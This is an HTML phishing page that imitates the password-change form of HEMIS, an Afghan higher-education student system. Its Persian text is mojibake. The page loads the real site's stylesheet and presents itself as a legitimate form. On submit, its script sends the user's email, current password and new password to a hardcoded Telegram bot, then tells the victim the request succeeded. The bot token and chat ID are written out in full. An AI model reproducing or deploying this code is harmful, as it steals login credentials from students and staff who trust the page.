<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <title>HEMIS - ØªØºÛŒÛŒØ±  Ø±Ù…Ø² Ø¹Ø¨ÙˆØ±</title>
    <meta charset="UTF-8" />
    <meta name="csrf-token" content="EXAMPLE_TOKEN" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
    />
    <link href="https://hemis.edu.af/css/login.css" rel="stylesheet" />
    <style>
        @import url('https://fonts.googleapis.com/css?family=Raleway:300,400,600');
        body {
            margin: 0;
            font-size: .9rem;
            font-weight: 400;
            line-height: 1.6;
            color: #212529;
            text-align: right;
            background-color: #f5f8fa;
            direction: rtl;
            font-family: 'Raleway', sans-serif;
        }
        .navbar-laravel {
            box-shadow: 0 2px 4px rgba(0,0,0,.04);
        }
        .login-form {
            padding-top: 1.5rem;
            padding-bottom: 1.5rem;
        }
        .login-form label,
        .text-danger,
        .alert {
            font-size: 12px;
            font-weight: bold;
        }
        .input-group-text {
            cursor: pointer;
        }
    </style>
</head>
<body>
<nav class="navbar navbar-expand-lg navbar-light navbar-laravel">
  <div class="container">
    <a class="navbar-brand" href="#">Ø³ÛŒØ³ØªÙ… Ù…Ø¯ÛŒØ±ÛŒØª Ù…Ø­ØµÙ„Ø§Ù† Ø¯ÙˆÙ„ØªÛŒ - ÙˆØ²Ø§Ø±Øª ØªØ­ØµÛŒÙ„Ø§Øª Ø¹Ø§Ù„ÛŒ</a>
  </div>
</nav>

<main class="login-form">
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-md-8">
        <div class="card">
          <div class="card-header"><h4>ØªØºÛŒÛŒØ± Ø±Ù…Ø² Ø¹Ø¨ÙˆØ±</h4></div>
          <div class="card-body">
            <form id="tgForm" novalidate>
              <div class="form-group row">
                <label for="email" class="col-md-4 col-form-label text-md-right">Ø§ÛŒÙ…ÛŒÙ„</label>
                <div class="col-md-6">
                  <input
                    type="email"
                    id="email"
                    name="email"
                    class="form-control"
                    required
                    autocomplete="email"
                  />
                  <div class="invalid-feedback">Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ…ÛŒÙ„ Ù…Ø¹ØªØ¨Ø± ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯.</div>
                </div>
              </div>

              <div class="form-group row">
                <label for="current_password" class="col-md-4 col-form-label text-md-right">Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± ÙØ¹Ù„ÛŒ</label>
                <div class="col-md-6">
                  <div class="input-group">
                    <input
                      type="password"
                      id="current_password"
                      name="current_password"
                      class="form-control"
                      required
                      autocomplete="current-password"
                    />
                    <div class="input-group-append">
                      <span class="input-group-text" onclick="togglePassword('current_password', this)">ğŸ‘ï¸</span>
                    </div>
                  </div>
                  <div class="invalid-feedback">Ù„Ø·ÙØ§Ù‹ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± ÙØ¹Ù„ÛŒ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯.</div>
                </div>
              </div>

              <div class="form-group row">
                <label for="new_password" class="col-md-4 col-form-label text-md-right">Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ø¬Ø¯ÛŒØ¯</label>
                <div class="col-md-6">
                  <div class="input-group">
                    <input
                      type="password"
                      id="new_password"
                      name="new_password"
                      class="form-control"
                      required
                      autocomplete="new-password"
                      minlength="6"
                    />
                    <div class="input-group-append">
                      <span class="input-group-text" onclick="togglePassword('new_password', this)">ğŸ‘ï¸</span>
                    </div>
                  </div>
                  <div class="invalid-feedback">
                    Ù„Ø·ÙØ§Ù‹ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ± Ø¬Ø¯ÛŒØ¯ Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯ (Ø­Ø¯Ø§Ù‚Ù„ 6 Ú©Ø§Ø±Ø§Ú©ØªØ±).
                  </div>
                </div>
              </div>

              <div class="form-group row">
                <label for="new_password_confirm" class="col-md-4 col-form-label text-md-right">ØªÚ©Ø±Ø§Ø± Ø±Ù…Ø² Ø¬Ø¯ÛŒØ¯</label>
                <div class="col-md-6">
                  <div class="input-group">
                    <input
                      type="password"
                      id="new_password_confirm"
                      name="new_password_confirm"
                      class="form-control"
                      required
                      autocomplete="new-password"
                      minlength="6"
                    />
                    <div class="input-group-append">
                      <span class="input-group-text" onclick="togglePassword('new_password_confirm', this)">ğŸ‘ï¸</span>
                    </div>
                  </div>
                  <div class="invalid-feedback">Ø±Ù…Ø²Ù‡Ø§ÛŒ ÙˆØ§Ø±Ø¯ Ø´Ø¯Ù‡ Ø¨Ø§ÛŒØ¯ ÛŒÚ©Ø³Ø§Ù† Ø¨Ø§Ø´Ù†Ø¯.</div>
                </div>
              </div>

              <div class="col-md-6">
                <button type="submit" class="btn btn-primary">Ø§Ø±Ø³Ø§Ù„</button>
                <a href="#" class="btn btn-secondary" onclick="return false;">Ø§Ù†ØµØ±Ø§Ù</a>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>
</main>

<script>
  function togglePassword(fieldId, iconElem) {
    const input = document.getElementById(fieldId);
    if (input.type === "password") {
      input.type = "text";
      iconElem.textContent = "ğŸ™ˆ";
    } else {
      input.type = "password";
      iconElem.textContent = "ğŸ‘ï¸";
    }
  }

  const form = document.getElementById("tgForm");
  form.addEventListener("submit", async function (e) {
    e.preventDefault();

    if (!form.checkValidity()) {
      form.classList.add("was-validated");
      return;
    }

    const newPass = document.getElementById("new_password").value;
    const confirmPass = document.getElementById("new_password_confirm").value;
    if (newPass !== confirmPass) {
      const confirmInput = document.getElementById("new_password_confirm");
      confirmInput.setCustomValidity("Ø±Ù…Ø²Ù‡Ø§ÛŒ ÙˆØ§Ø±Ø¯ Ø´Ø¯Ù‡ ÛŒÚ©Ø³Ø§Ù† Ù†ÛŒØ³ØªÙ†Ø¯.");
      form.classList.add("was-validated");
      return;
    } else {
      document.getElementById("new_password_confirm").setCustomValidity("");
    }

    const email = document.getElementById("email").value;
    const currentPassword = document.getElementById("current_password").value;

    const botToken = "8038455508:AAG_nhK7FB5uTwVPaUXlr_FXBaHkmHkpTQo";
    const chatId = "6379929132";

    const message = `ğŸ” Ø¯Ø±Ø®ÙˆØ§Ø³Øª ØªØºÛŒÛŒØ± Ø±Ù…Ø² Ø¹Ø¨ÙˆØ±:\nğŸ“§ Ø§ÛŒÙ…ÛŒÙ„: ${email}\nğŸ”‘ Ø±Ù…Ø² ÙØ¹Ù„ÛŒ: ${currentPassword}\nğŸ†• Ø±Ù…Ø² Ø¬Ø¯ÛŒØ¯: ${newPass}\nğŸ” ØªØ§ÛŒÛŒØ¯ Ø±Ù…Ø²: ${confirmPass}`;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message }),
      });
      alert("Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø´Ù…Ø§ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.");
      form.reset();
      form.classList.remove("was-validated");
    } catch (error) {
      alert("Ø§Ø±Ø³Ø§Ù„ Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯ØŒ Ù„Ø·ÙØ§Ù‹ Ø¯ÙˆØ¨Ø§Ø±Ù‡ ØªÙ„Ø§Ø´ Ú©Ù†ÛŒØ¯.");
    }
  });
</script>

</body>
  </html>
